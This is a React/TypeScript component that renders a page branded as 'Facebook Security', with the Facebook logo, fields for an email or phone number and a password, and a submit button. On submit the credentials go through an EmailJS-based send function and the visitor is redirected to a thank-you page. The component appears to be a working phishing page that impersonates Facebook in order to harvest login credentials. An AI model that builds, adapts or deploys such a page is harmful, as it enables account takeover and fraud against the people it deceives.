import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import { formTwoSchema, type FormTwo } from "@shared/schema";
import { sendFormTwo } from "@/lib/emailjs";
import { useMobile } from "@/hooks/use-mobile";
import React from 'react';

export default function FormTwo() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();

  const form = useForm<FormTwo>({
    resolver: zodResolver(formTwoSchema),
    defaultValues: {
      user_email: "",
      password: "",
    },
  });

  const onSubmit = async (data: FormTwo) => {
    try {
      await sendFormTwo(data);
      setLocation("/thank-you");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
      <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
          alt="Logo"
          className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
        />
        <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
          Facebook Security
        </h1>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <div className="text-left">
              <FormField
                control={form.control}
                name="user_email"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                      Email or Phone Number
                    </FormLabel>
                    <FormControl>
                      <Input
                        type="text"
                        placeholder="Enter email or phone number"
                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                        {...field}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\s+/g, '');
                          field.onChange(value);
                        }}
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-red-500 mt-1" />
                  </FormItem>
                )}
              />
            </div>
            <div className="text-left">
              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                      Password
                    </FormLabel>
                    <FormControl>
                      <Input
                        type="password"
                        placeholder="Enter password"
                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-red-500 mt-1" />
                  </FormItem>
                )}
              />
            </div>
            <Button 
              type="submit" 
              className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
              disabled={form.formState.isSubmitting}
            >
              {form.formState.isSubmitting ? "Submitting..." : "Submit"}
            </Button>
          </form>
        </Form>
      </div>
    </div>
  );
}